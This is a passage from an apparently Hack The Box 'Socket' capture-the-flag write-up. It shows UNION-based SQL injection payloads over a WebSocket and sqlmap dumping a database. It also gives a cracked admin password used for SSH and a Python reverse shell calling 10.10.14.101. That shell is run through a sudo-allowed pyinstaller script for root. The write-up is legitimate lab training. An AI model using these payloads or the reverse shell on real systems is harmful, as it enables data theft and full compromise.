+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT username,password,role,NULL FROM users where id = 1-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;0c090c365fa0559b151a43e0fea39710&#34;</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT username,password,role,NULL FROM users where id = 2-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid version!&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After dumping credentials for <code>admin</code>, there are no other entries in the table.
+Before leaving the sql database, we should explore some of the other tables. This turned out to be a good idea, because more useful information is found in the <code>answers</code> table:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-JSON" data-lang="JSON"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 1-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT,  answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT answered_by,answer,status,NULL FROM answers where id = 1-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;Hello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller&#34;</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="s2">&#34;PENDING&#34;</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT answered_by,answer,status,NULL FROM answers where id = 2-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller&#34;</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="s2">&#34;PENDING&#34;</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT answered_by,answer,status,NULL FROM answers where id = 3-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid version!&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see messages from an id of <code>admin</code>, where he signs off as Thomas Keller. This can give us potential ideas as to what username(s) might be on the machine.</p>
+<h4 id="bonus-using-sqlmap-to-dump-the-database">Bonus: using SQLMap to dump the database</h4>
+<p>Because the SQL injection is done through a WebSocket interaction, utilizing SQLMap is a little more complex than usual. Although SQLMap has WebSocket compatibility, it has been difficult to properly launch in my experience. However, there is a <a class="link" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html"  target="_blank" rel="noopener"
+    >nice blog article</a> that highlights a clever approach to using sqlmap over a WebSocket. In this approach, the author sets up a python server script that will receive SQLMap&rsquo;s queries, transform the payload to a relevant JSON query, then redirect it to the WebSocket of interest.</p>
+<p>First, the python redirection script needs to be updated to our situation. The ws_server value must be changed, and also the payload replace line must be altered.
+Line 6:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ws_server = &#34;ws://10.10.11.206:5789/version&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Line 14:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">message</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\\\&#34;</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1"># replacing &#34; with &#39; to avoid breaking JSON structure</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;{&#34;version&#34;:&#34;</span><span class="si">%s</span><span class="s1">&#34;}&#39;</span> <span class="o">%</span> <span class="n">message</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can run the python script, and in a new tab initiate sqlmap.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python wserv.py
+</span></span><span class="line"><span class="cl">[+] Starting MiddleWare Server
+</span></span><span class="line"><span class="cl">[+] Send payloads in http://localhost:8081/?id=*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And finally run sqlmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -u http://localhost:8081/?id<span class="o">=</span>0.0.1 --tables --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="sqlmap-output">SQLMap output:</h5>
+<p>Database: <current><br>
+Table: reports<br>
+[2 entries]</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">| id | subject                   | description                                                                                                         | reported_date | reporter_name |
+</span></span><span class="line"><span class="cl">|----|---------------------------|---------------------------------------------------------------------------------------------------------------------|---------------|---------------|
+</span></span><span class="line"><span class="cl">| 1  | Accept JPEG files         | Is there a way to convert JPEG images with this tool? Or should I convert my JPEG to PNG and then use it?           | 13/08/2022    | Jason         |
+</span></span><span class="line"><span class="cl">| 2  | Converting non-ascii text | When I try to embed non-ascii text, it always gives me an error. It would be nice if you could take a look at this. | 22/09/2022    | Mike          |
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Database: <current><br>
+Table: users<br>
+[1 entry]</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">| id | role  | password                         | username | 
+</span></span><span class="line"><span class="cl">|----|-------|----------------------------------|----------|
+</span></span><span class="line"><span class="cl">| 1  | admin | 0c090c365fa0559b151a43e0fea39710 | admin    | 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Database: <current><br>
+Table: answers<br>
+[2 entries]</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">| id | report_id | answer                                                                                                                                                             | status  | FOREIGN | answered_by | answered_date |
+</span></span><span class="line"><span class="cl">|----|-----------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------|---------|-------------|---------------|
+</span></span><span class="line"><span class="cl">| 1  | <span class="p">&lt;</span><span class="nt">blank</span><span class="p">&gt;</span>   | Hello Json, As if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.                                                    | PENDING | <span class="p">&lt;</span><span class="nt">blank</span><span class="p">&gt;</span> | admin       | 17/08/2022    |
+</span></span><span class="line"><span class="cl">| 2  | <span class="p">&lt;</span><span class="nt">blank</span><span class="p">&gt;</span>   | Hello Mike, We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now! Thomas Keller | PENDING | <span class="p">&lt;</span><span class="nt">blank</span><span class="p">&gt;</span> | admin       | 25/09/2022    |
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>SQLMap produces everything very fast in case we missed something, but it was a little tricky to set up this time. If the SQLi type had been a blind injection, enumerating everything by hand can be extremely time consuming. It is good to know how we might make automation for this task possible.</p>
+<h3 id="authenticating-through-ssh">Authenticating through ssh</h3>
+<p>With exploration of the database finished, we can finally move on to the obtained Administrator credentials. Since it is information stored in the sqlite table, it is highly likely to be a password hash. Fortunately enough, we don&rsquo;t even have to crack it ourselves. A quick trip over to <a class="link" href="https://crackstation.net/"  target="_blank" rel="noopener"
+    >crackstation</a>, and we get the plaintext password immediately.</p>
+<p><img src="/post/hackthebox-socket/images/Crack.PNG"
+	width="1038"
+	height="394"
+	srcset="/post/hackthebox-socket/images/Crack_hua8b5a34d41f97a65a9e9d50967dee9eb_42237_480x0_resize_box_3.PNG 480w, /post/hackthebox-socket/images/Crack_hua8b5a34d41f97a65a9e9d50967dee9eb_42237_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+		alt="Admin Cracked"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="632px"
+	
+></p>
+<p>We now have creds as <code>Admin:denjanjade122566</code></p>
+<p>Trying to log in through ssh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh admin@qreader.htb
+</span></span><span class="line"><span class="cl">admin@qreader.htb<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Permission denied, please try again.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The password doesn&rsquo;t work for the user <code>admin</code>, but based on the other messages we gleaned from the database we know his name as well. On my first guessing combination, I land at a successful login for <code>tkeller</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh tkeller@qreader.htb
+</span></span><span class="line"><span class="cl">tkeller@qreader.htb<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.2 LTS <span class="o">(</span>GNU/Linux 5.15.0-67-generic x86_64<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>One tool that might be helpful for generating usernames from full names is <a class="link" href="https://github.com/urbanadventurer/username-anarchy"  target="_blank" rel="noopener"
+    >username_anarchy</a>. In this case because of my lucky guess, I did not need to use.</p>
+<p>At this point the <code>user.txt</code> is up for grabs.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="enumeration">Enumeration:</h3>
+<p>Checking <code>tkeller's</code> sudo privileges,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tkeller@socket:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> tkeller on socket:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User tkeller may run the following commands on socket:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/sbin/build-installer.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see that we can run <code>build-installer.sh</code> as any user, including root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tkeller@socket:~$ cat /usr/local/sbin/build-installer.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="nv">$#</span> -ne <span class="m">2</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[[</span> <span class="nv">$1</span> !<span class="o">=</span> <span class="s1">&#39;cleanup&#39;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">  /usr/bin/echo <span class="s2">&#34;No enough arguments supplied&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">exit</span> 1<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">action</span><span class="o">=</span><span class="nv">$1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">name</span><span class="o">=</span><span class="nv">$2</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ext</span><span class="o">=</span><span class="k">$(</span>/usr/bin/echo <span class="nv">$2</span> <span class="p">|</span>/usr/bin/awk -F<span class="s1">&#39;.&#39;</span> <span class="s1">&#39;{ print $(NF) }&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> -L <span class="nv">$name</span> <span class="o">]]</span><span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl">  /usr/bin/echo <span class="s1">&#39;Symlinks are not allowed&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">exit</span> 1<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;build&#39;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="o">[[</span> <span class="nv">$ext</span> <span class="o">==</span> <span class="s1">&#39;spec&#39;</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">    /home/svc/.local/bin/pyinstaller <span class="nv">$name</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/mv ./dist ./build /opt/shared
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Invalid file format&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> 1<span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="o">[[</span> <span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;make&#39;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="o">[[</span> <span class="nv">$ext</span> <span class="o">==</span> <span class="s1">&#39;py&#39;</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">    /root/.local/bin/pyinstaller -F --name <span class="s2">&#34;qreader&#34;</span> <span class="nv">$name</span> --specpath /tmp
+</span></span><span class="line"><span class="cl">   /usr/bin/mv ./dist ./build /opt/shared
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Invalid file format&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> 1<span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="o">[[</span> <span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;cleanup&#39;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">  /usr/bin/rm -r ./build ./dist 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">  /usr/bin/rm /tmp/qreader* 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">  /usr/bin/echo <span class="s1">&#39;Invalid action&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">exit</span> 1<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>All binaries are defined by full path, so we cannot get an easy win through PATH abuse.</p>
+<p>Looking at segments where we might supply our own input, we can see under &lsquo;build&rsquo; and &lsquo;make&rsquo; options, we supply the file names following <code>pyinstaller</code>. Pyinstaller is used to compile easily-launchable binary files from python code. In this situation, pyinstaller is used so that the QReader code, written in python, can exist in a single executable for users to download. <code>Pyinstaller</code> compiling can be well customized through use of <code>.spec</code> files, which it uses to determine how to process your python script. More info can be found [here]](<a class="link" href="https://pyinstaller.org/en/stable/spec-files.html%29"  target="_blank" rel="noopener"
+    >https://pyinstaller.org/en/stable/spec-files.html)</a>. Since we are running pyinstaller as root, perhaps we can define in the <code>.spec</code> file for root to do other actions.</p>
+<h3 id="using-the-make-script-to-produce-a-spec-template">Using the <code>make</code> script to produce a .spec template</h3>
+<p>For testing around, I used a python rev shell script. The python file&rsquo;s contents shouldn&rsquo;t matter, but I figured why not.</p>
+<p>rev.py:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;10.10.14.101&#34;</span><span class="p">,</span><span class="mi">8001</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&#34;sh&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Running <code>make</code> once on this creates a .spec file for us to use and create our own executable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tkeller@socket:/tmp/$ sudo /usr/local/sbin/build-installer.sh make rev.py 
+</span></span><span class="line"><span class="cl"><span class="m">384</span> INFO: PyInstaller: 5.6.2
+</span></span><span class="line"><span class="cl"><span class="m">384</span> INFO: Python: 3.10.6
+</span></span><span class="line"><span class="cl"><span class="m">387</span> INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
+</span></span><span class="line"><span class="cl"><span class="m">387</span> INFO: wrote /tmp/qreader.spec
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">tkeller@socket:/tmp/$ cat qreader.spec 
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- mode: python ; coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">block_cipher</span> <span class="o">=</span> None
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">a</span> <span class="o">=</span> Analysis<span class="o">(</span>
+</span></span><span class="line"><span class="cl">    <span class="o">[</span><span class="s1">&#39;rev.py&#39;</span><span class="o">]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">pathex</span><span class="o">=[]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">binaries</span><span class="o">=[]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">datas</span><span class="o">=[]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">hiddenimports</span><span class="o">=[]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">hookspath</span><span class="o">=[]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">hooksconfig</span><span class="o">={}</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">runtime_hooks</span><span class="o">=[]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">excludes</span><span class="o">=[]</span>,
+</span></span><span class="line"><span class="cl">    <span class="nv">win_no_prefer_redirects</span><span class="o">=</span>False,
+</span></span><span class="line"><span class="cl">    <span class="nv">win_private_assemblies</span><span class="o">=</span>False,
+</span></span><span class="line"><span class="cl">    <span class="nv">cipher</span><span class="o">=</span>block_cipher,
